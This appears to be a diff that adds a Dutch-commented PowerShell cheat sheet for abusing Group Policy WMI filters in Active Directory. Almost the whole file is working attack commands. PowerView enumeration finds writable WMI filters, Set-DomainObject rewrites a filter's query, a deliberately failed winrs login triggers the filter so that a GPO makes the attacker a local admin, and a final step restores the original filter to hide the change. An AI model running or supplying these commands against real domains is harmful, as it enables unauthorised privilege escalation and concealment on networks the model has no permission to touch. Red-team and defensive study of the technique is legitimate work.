@@ -1,0 +1,39 @@
+# WMI Filter Abuse — GPO WMI filter wijzigen om code execution te triggeren
+# Wijzig een WMI filter zodat een GPO wordt toegepast op een machine die je wilt compromitteren
+
+# === Enumeratie ===
+
+# Vind GPOs met WMI filters (PowerView)
+(Get-DomainObject -SearchBase "CN=Policies,CN=System,DC=DOMAIN_DN" -LDAPFilter "(objectclass=groupPolicyContainer)" | ?{$_.gpcwqlfilter -ne $null}).Displayname
+
+# Vind wie schrijfrechten heeft op WMI filters
+Get-DomainObjectAcl -SearchBase "CN=SOM,CN=WmiPolicy,CN=System,DC=DOMAIN_DN" -LDAPFilter "(objectclass=msWMI-Som)" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -like "*WriteProperty*"} | %{ConvertFrom-SID $_.SecurityIdentifier}
+
+# Lees de huidige WMI filter inhoud
+Get-DomainObject -SearchBase "CN=SOM,CN=WmiPolicy,CN=System,DC=DOMAIN_DN" -LDAPFilter "(objectclass=msWMI-Som)" -Properties name,mswmi-name,mswmi-parm2 | fl
+
+# Vind de OU waarop de GPO is toegepast
+Get-DomainOU | ?{$_.gplink -match (Get-DomainObject -SearchBase "CN=Policies,CN=System,DC=DOMAIN_DN" -LDAPFilter "(objectclass=groupPolicyContainer)" | ?{$_.gpcwqlfilter -ne $null}).cn}
+
+# GPO local group mapping (welke groepen worden admin via GPO)
+Get-DomainGPOLocalGroup
+
+# === Exploit: WMI filter wijzigen ===
+
+# Wijzig de WMI filter om te matchen op een specifiek event (bijv. mislukte login)
+Set-DomainObject -Identity "{WMI_FILTER_GUID}" -Set @{ 'mswmi-parm2' = "1;3;10;120;WQL;root\CIMv2;SELECT EventCode FROM Win32_NTLogEvent WHERE Logfile='Security' AND EventCode=4625 AND Message LIKE '%TRIGGER_USERNAME%';" } -Verbose
+
+# Trigger de WMI filter met een opzettelijk mislukte login
+winrs -r:TARGET_MACHINE -u:TRIGGER_USERNAME -p:whatever cmd
+
+# De GPO wordt nu toegepast → gebruiker/groep wordt local admin
+
+# === Alternatief: WMI filter op computernaam ===
+Set-DomainObject -Identity "{WMI_FILTER_GUID}" -Set @{ 'mswmi-parm2' = "1;3;10;66;WQL;root\CIMv2;SELECT * FROM Win32_ComputerSystem WHERE Name = 'TARGET_HOSTNAME';" } -Verbose
+
+# === Opruimen: herstel originele filter ===
+Set-DomainObject -Identity "{WMI_FILTER_GUID}" -Set @{ 'mswmi-parm2' = "ORIGINAL_WMI_QUERY" } -Verbose
+
+# Noot: WriteProperty op WMI filter objecten is vereist
+# Noot: De GPO moet een actie bevatten die nuttig is (bijv. groep toevoegen aan local admin)
+# Noot: WMI filter evaluatie gebeurt bij GPO refresh (standaard elke 90 minuten of bij gpupdate)
